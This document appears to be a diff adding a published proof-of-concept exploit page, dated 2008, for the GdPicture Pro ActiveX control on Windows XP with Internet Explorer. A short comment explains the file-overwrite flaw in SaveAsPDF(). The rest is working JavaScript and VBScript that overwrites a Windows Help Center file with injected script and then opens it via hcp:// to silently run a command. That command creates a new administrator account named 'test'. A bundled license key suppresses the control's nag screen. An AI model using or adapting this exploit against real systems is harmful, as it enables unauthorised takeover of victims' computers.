@@ -1,0 +1,62 @@
+<!--
+
+	---------------------------------------------------------------------------------
+	GdPicture Pro ActiveX (gdpicture4s.ocx) Remote File Overwrite / Execution Exploit
+	---------------------------------------------------------------------------------
+	
+	author...: EgiX
+	mail.....: n0b0d13s[at]gmail[dot]com
+	
+	link.....: http://www.gdpicture.com/
+	ProgID...: GdPicture4S.Imaging
+	
+	Description:
+	
+	SaveAsPDF() method allow to create / overwrite file through
+	sFilePath argument. By using other arguments, such as sTitle,
+	an attacker could be inject html code and execute it using
+	the hcp:// protocol (tecnique discovered by rgod).
+	Also GdPicturePro5.Imaging is prone to this vulnerability,
+	but it doesn't implements the IObjectSafety interface.
+	
+	Tested on Windows XP SP2 with IE 6/7
+	
+	Object safety report:
+	
+	Report for Clsid: {E8512363-3581-42EF-A43D-990E7935C8BE}
+	RegKey Safe for Script: False
+	RegKey Safe for Init: False
+	Implements IObjectSafety: True
+	IDisp Safe:  Safe for untrusted: caller,data  
+	IPStorage Safe:  Safe for untrusted: caller,data
+
+	[*] A special thanks goes to shinnai, for his patience :)
+
+-->
+
+<object classid='clsid:E8512363-3581-42EF-A43D-990E7935C8BE' id='test'></object>
+
+<script language='javascript'>
+
+	var cmd = "cmd /c net user test test /add & net localgroup Administrators test /add";
+
+	var outFile = "c:\\windows\\pchealth\\helpctr\\system\\errors\\badurl.htm";
+
+	var BMP = "\x42\x4d\x42\x00\x00\x00\x00\x00\x00\x00\x3e" +
+		  "\x00\x00\x00\x28\x00\x00\x00\x01\x00\x00\x00" +
+		  "\x01\x00\x00\x00\x01\x00\x01\x00\x00\x00\x00" +
+		  "\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
+		  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
+		  "\x00\x00\x00\xff\xff\xff\x00\x80\x00\x00\x00";
+
+	var sc = "<object classid='clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8' id='wsh'><\/object>" +
+		 "<script language='vbscript'>wsh.Run \"" + cmd + "\", SW_HIDE<\/script>";
+
+	test.SetLicenseNumber("0317955669879948884162456"); // only to avoid the nag screen
+	test.CreateImageFromString(BMP);
+
+	if (test.SaveAsPDF(outFile, sc, "", "", "")) location.href = "hcp://system/errors/badurl.htm";
+
+</script>
+
+# milw0rm.com [2008-09-30]
